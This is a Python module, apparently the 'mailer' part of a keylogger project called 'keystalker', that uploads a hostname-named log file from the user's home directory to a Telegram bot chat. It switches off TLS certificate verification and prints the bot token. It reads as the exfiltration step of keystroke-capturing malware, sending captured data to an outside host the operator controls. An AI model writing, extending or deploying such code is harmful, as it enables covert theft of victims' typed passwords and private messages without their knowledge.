import requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from pathlib import Path
import platform
from dotenv import load_dotenv
import os 
LOG_FILE = Path.home() / f"{platform.node()}.log"

load_dotenv()  # Load environment variables from .env file
BOT_TOKEN = os.environ["TELEGRAM_API"]
CHAT_ID = os.environ["CHAT_ID"]

def send_log():
    if not LOG_FILE.exists() or LOG_FILE.stat().st_size == 0:
        return

    url = f"https://api.telegram.org/{BOT_TOKEN}/sendDocument"
    with open(LOG_FILE, "rb") as f:
        r = requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f}, verify=False)
        print(r.status_code, r.text)

    
def get_chat_id():
    print(f"BOT_TOKEN: {BOT_TOKEN}")
    response = requests.get(
        f"https://api.telegram.org/{BOT_TOKEN}/getUpdates",
        timeout=30
    )
    print(response.json())

# Uncomment and run this file using this command python src\keystalker\actions\mailer.py
# if __name__ == "__main__":
#     get_chat_id()

